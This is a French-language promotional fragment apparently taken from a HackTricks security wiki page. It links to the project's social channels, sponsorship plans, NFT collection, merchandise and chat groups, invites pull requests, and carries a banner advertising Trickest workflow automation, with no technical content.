<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au [dépôt hacktricks](https://github.com/carlospolop/hacktricks) et au [dépôt hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Utilisez [**Trickest**](https://trickest.io/) pour construire et **automatiser facilement des workflows** alimentés par les outils communautaires les plus avancés au monde.\
Obtenez l'accès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
